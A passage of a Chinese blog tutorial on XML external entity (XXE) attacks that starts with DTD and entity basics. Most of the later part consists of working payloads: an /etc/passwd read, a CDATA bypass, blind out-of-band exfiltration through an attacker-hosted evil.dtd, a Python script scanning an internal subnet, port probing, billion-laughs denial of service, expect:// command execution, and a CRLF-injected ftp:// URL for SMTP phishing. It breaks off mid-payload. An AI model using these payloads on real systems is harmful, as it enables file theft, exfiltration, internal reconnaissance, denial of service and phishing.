元素中，会发生错误，一些特殊字符需要转义。</p></li></ul><p>此外，好的XML文档不仅遵循XML的规范，还符合DTD(document type definition)规范。</p><h2 id="什么是DTD？"><a href="#什么是DTD？" class="headerlink" title="什么是DTD？"></a>什么是DTD？</h2><p>所谓的DTD，Document Type Definition，文件类型定义，用来宣告网页的文件类型。举例来说，HTML 有很多版本，如：HTML, HTML2.0, … , XHTML, XHTML5 等，利用&lt;!DOCTYPE&gt; 让浏览器能正确显示内容。</p><p>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。可一致地使用某个标准的 DTD 来交换数据。应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。还可以使用 DTD 来验证您自身的数据。</p><p>它使用一系列合法的元素来定义文档结构：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt; </span><br></pre></td></tr></table></figure><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><p><strong>内部的 DOCTYPE 声明</strong></p><p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><p>带有 DTD 的 XML 文档实例：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [这是DTD内部声明</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span>      (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>以上 DTD 解释如下：</strong></p><ul><li><p><strong>!DOCTYPE note</strong> (第二行)定义此文档是 <em>note</em> 类型的文档。</p></li><li><p><strong>!ELEMENT note</strong> (第三行)定义 <em>note</em> 元素有四个元素：”to、from、heading,、body”</p></li><li><p><strong>!ELEMENT to</strong> (第四行)定义 <em>to</em> 元素为 “#PCDATA” 类型</p><p>(之后类似)</p></li></ul><p><strong>这里有一个小重点Tips：</strong></p><ul><li>“#PCDATA” 类型为被解析的字符数据（parsed character data）。表示读文件按照XML格式进行解析</li><li>“#CDATA”类型为字符数据（character data）。表示读文件但是不用解析，直接读文件的原始内容</li></ul><p><strong>外部文档声明</strong></p><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><p>这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD: </p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;note.dtd&quot;</span>&gt;</span># dtd文件的绝对路径</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>这是包含 DTD 的 “note.dtd” 文件：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><p>其他更多的可能需要读者参考这个链接进行学习<a href="http://www.w3school.com.cn/dtd/index.asp%E3%80%82">http://www.w3school.com.cn/dtd/index.asp。</a></p><p><strong>一个内部实体声明</strong></p><p>语法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-string">&quot;test&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p><p><strong>一个外部实体声明</strong></p><p>语法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/test.dtd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="XXE-的成因"><a href="#XXE-的成因" class="headerlink" title="XXE 的成因"></a>XXE 的成因</h1><p>上面介绍了这么多，大概才把XXE的基础知识介绍完，接下来，我们具体看一下这个<strong>外部实体注入漏洞</strong>的成因和攻击面。</p><p><strong>会发生XXE 主要是因为<code>parser</code> 没有禁止使用外部实体</strong>，如常见的php函数<code>simplexml_load_string()</code>会解析外部实体。我们可以自行定义一个实体名称，并在实体内容中定义要服务器做的行为，从而造成攻击，因此注入点通常是可以输入XML 的位置。</p><h1 id="XXE的攻击面"><a href="#XXE的攻击面" class="headerlink" title="XXE的攻击面"></a>XXE的攻击面</h1><p>那么，我们究竟可以利用XXE做哪些事情呢？下面介绍一下XXE的攻击面。</p><h2 id="1-有回显的任意文件读取"><a href="#1-有回显的任意文件读取" class="headerlink" title="1. 有回显的任意文件读取"></a>1. 有回显的任意文件读取</h2><p>攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们可以控制输入的XML代码造成服务器上任意文件的读取。</p><p><strong>xml.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> $creds;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/2019-02-14_00001.png"></p><p>但是直接读文件，在遇到文件内容中含有<code>&lt;</code>,<code>&amp;</code>等未转义的字符时，解析会报错。这是由于XML的外部实体特性导致的，如以下文件：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;HTML5 rose&lt;&#x2F;title&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20190214210529.png"></p><p><strong>解决方案</strong></p><p>前面提到CDATA是将文件当做原始字符串而不进行解析，于是，可以通过 <code>&lt;![CDATA[</code>和 <code>]]&gt;</code>将payload包裹起来，使其不解析为XML就可以读取此类文件了。由于普通实体不能直接拼接，需要先拼接再调用，于是需要利用参数实体。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;e:&#x2F;test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br><span class="line"></span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;&#x2F;roottag&gt;</span><br></pre></td></tr></table></figure><p><strong>evil.dtd</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%xxe;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/15/5c66bb86897a5.png"></p><p>于是通过<code>XXE</code>和<code>CDATA</code>就基本上实现了任意文件读取。</p><h2 id="2-无回显任意文件读取（Blind-OOB-XXE）"><a href="#2-无回显任意文件读取（Blind-OOB-XXE）" class="headerlink" title="2. 无回显任意文件读取（Blind OOB XXE）"></a>2. 无回显任意文件读取（Blind OOB XXE）</h2><p>通常情况下，xml文件是用于服务器的各项配置的，而不是直接输出的，于是我们需要寻找其他不依托服务器回显的方法来实现任意文件读取。</p><p><strong>xml.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//相比上一段代码，缺少了回显过程，只有解析过程。</span></span><br><span class="line">libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那么，利用什么方法来进行无回显的读取呢？</p><p>通过之前的学习，我们知道参数实体是可以合并依次调用的。那么我们可以利用三个参数实体，先去访问VPS的一个<code>evil.dtd</code>，调用<code>evil.dtd</code>的参数去读取服务器的敏感文件，放到一个参数中，再利用最后一个参数实体将文件内容发到VPS的一个端口。</p><p>利用这个思路，我们可以构造这样的payload：</p><p><strong>test.dtd</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;e:&#x2F;test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;ip:2333?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>payload：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/15/5c66cf1bf405b.png"></p><p><img src="https://i.loli.net/2019/02/15/5c66cefa5b4a8.png"></p><p><strong>需要注意的是</strong>dtd文件中作为内容的一段实体数据需要转义<code>&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://ip:2333?p=%file;&#39;&gt;&quot;</code></p><p>发现虽然无回显，但是依然可以通过这样的方法读取数据。</p><p>笔者通过一个图来理解整个调用过程：</p><p><img src="https://i.loli.net/2019/02/17/5c695e47dc191.png"></p><p>上面说了XXE读文件的两种操作，主要适合利用<code>file</code>协议，攻击方式上有点类似SSRF，通过伪造xml外部实体或者dtd文件来执行，读取服务器上的敏感文件。事实上，我们还可以通过XXE打开内网渗透的大门，下面来学习一下通过XXE进行内网的探测。</p><h2 id="3-http内网探测"><a href="#3-http内网探测" class="headerlink" title="3. http内网探测"></a>3. http内网探测</h2><p>类似的，我们通过读文件的方式判断是否存在内网主机，筛选出内网主机IP。如果能从中读取到内容，那么可以判断这个IP的内网主机是存在的。</p><p>在此之前，还有一个步骤需要完成，即确定内网的网段，时间宝贵，我们应该优先确定内网网段，再查找内网主机IP，所以需要利用XXE读取一些文件如<code>/proc/net/arp</code>，<code>/etc/host</code>等。</p><p>还是利用上面有回显<code>xml.php</code>为例子：</p><p><img src="https://i.loli.net/2019/02/17/5c691efa362df.png"></p><p>读取文件后，基本确定内网网段在<code>192.168.118.0</code></p><p>构建脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># referer: https://xz.aliyun.com/t/3357#toc-11</span></span><br><span class="line">ip_arr=[]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_xml</span>(<span class="params">string</span>):</span></span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE creds [&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="string">&#x27;&quot;&#x27;</span> + string + <span class="string">&#x27;&quot;&#x27;</span> + <span class="string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;creds&gt;&amp;xxe;&lt;/creds&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># print xml</span></span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_xml</span>(<span class="params">xml</span>):</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/xml&#x27;</span>&#125;</span><br><span class="line">    x = requests.post(<span class="string">&#x27;http://192.168.118.144/xxe.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="number">5</span>).text</span><br><span class="line">    <span class="keyword">print</span> x</span><br><span class="line">    <span class="comment"># print base64.b64decode(x)</span></span><br><span class="line">    <span class="keyword">if</span> x <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        ip_arr.append(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = str(i)</span><br><span class="line">        ip = <span class="string">&#x27;192.168.118.&#x27;</span> + i</span><br><span class="line">        string = <span class="string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        <span class="keyword">print</span> string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/2019-02-17_00001.png"></p><h2 id="4-http内网主机端口探测"><a href="#4-http内网主机端口探测" class="headerlink" title="4. http内网主机端口探测"></a>4. http内网主机端口探测</h2><p>关于端口探测，和主机探测是类似的意思，在确定主机IP后，固定IP，利用payload，循环修改端口，查看结果即可。通常情况下，可以根据响应时间/长度/响应数据，攻击者将可以判断该端口是否已被开启。</p><p>比如说，我们确定了一台主机，利用下面的payload，在测试环境下会报错，而且端口开放与未开放的报错不一样，于是可以进行区分(80为开放端口，2333为未开放端口)：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">data</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;https://127.0.0.1:83/&quot;</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">data</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>  </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>4<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/2019-02-17_00003.png"></p><p><img src="https://i.loli.net/2019/02/18/5c69991fbd04e.png"></p><p>可以利用<code>burpsuite</code>或者写脚本，都可以很轻松的进行端口扫描，但是若想全部扫描，这个过程会比较耗时，也可以构建常用端口字典，进行部分扫描，提高效率。</p><p><img src="https://i.loli.net/2019/02/17/5c695e0ec66f7.png"></p><p><img src="https://i.loli.net/2019/02/17/5c695ecb3514c.png"></p><p><em>笔者测试发现不同的环境，结果可能会不一样，因此可能需要不同的payload进行端口扫描，这个需要具体结合代码和测试结果来敲定一个有效的payload。</em></p><h2 id="5-XInclude"><a href="#5-XInclude" class="headerlink" title="5. XInclude"></a>5. XInclude</h2><p>这个和<code>SchemaEntity</code>有关，可以看成是XML的扩展和继承，想了解更多可能要参考这个： <a href="http://www.w3school.com.cn/schema/schema_intro.asp">http://www.w3school.com.cn/schema/schema_intro.asp</a></p><p><strong>XML Schema：</strong>称为可扩展标记语言架构，用来定义 XML 文档的合法构建模块，类似 DTD，Schema是DTD的替代者, 它比DTD可以做更多的事情 。</p><p>include的href属性中可以进行文件读取，也可以使用协议进行SSRF。不过Xinclude需要手动开启，测试发现所有xml parser都默认关闭这一特性。</p><p><strong>示例代码</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">&quot;file:///home/rq/f123333333ag&quot;</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="6-其他攻击"><a href="#6-其他攻击" class="headerlink" title="6. 其他攻击"></a>6. 其他攻击</h2><h3 id="6-1-DDoS"><a href="#6-1-DDoS" class="headerlink" title="6.1 DDoS"></a>6.1 DDoS</h3><p><strong>示例代码</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">  &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;&#x2F;lolz&gt;</span><br></pre></td></tr></table></figure><p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。<br>亦或者，如果目标是UNIX系统，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;dev&#x2F;random&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;&#x2F;foo&gt;</span><br></pre></td></tr></table></figure><p>如果 XML 解析器尝试使用 /dev/random 文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</p><h3 id="6-2-php-except模块下RCE"><a href="#6-2-php-except模块下RCE" class="headerlink" title="6.2 php except模块下RCE"></a>6.2 php except模块下RCE</h3><p>这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当/开发内部应用导致的。如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE。</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect:&#x2F;&#x2F;id&quot;&gt;]&gt;</span><br><span class="line">&lt;dir&gt;</span><br><span class="line">&lt;file&gt;&amp;cmd;&lt;&#x2F;file&gt;</span><br><span class="line">&lt;&#x2F;dir&gt;</span><br></pre></td></tr></table></figure><h3 id="6-3-钓鱼"><a href="#6-3-钓鱼" class="headerlink" title="6.3 钓鱼"></a>6.3 钓鱼</h3><p>如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼。以下内容摘自<a href="https://www.freebuf.com/articles/web/177979.html">https://www.freebuf.com/articles/web/177979.html</a></p><p>我们使用Java的XML解析器找到了一个易受攻击的端点。扫描内部端口后，我们发现了一个侦听在25端口的SMTP服务，Java支持在<code>sun.net.ftp.impl.FtpClient</code>中的ftp URI。因此，我们可以指定用户名和密码，例如<code>ftp://user:password@host:port/test.txt</code>，FTP客户端将在连接中发送相应的USER命令。</p><p>但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ftp:<span class="comment">//a%0D%0A</span></span><br><span class="line">EHLO%<span class="number">20</span>a%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">MAIL%<span class="number">20</span>FROM%<span class="number">3</span>A%<span class="number">3</span>Csupport%<span class="number">40</span>VULNERABLESYSTEM.com%<span class="number">3</span>E%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">RCPT%<span class="number">20</span>TO%<span class="number">3</span>A%<span class="number">3</span>Cvictim%<span class="number">40</span>gmail.com%<span class="number">3</span>E%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">DATA%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">From%<span 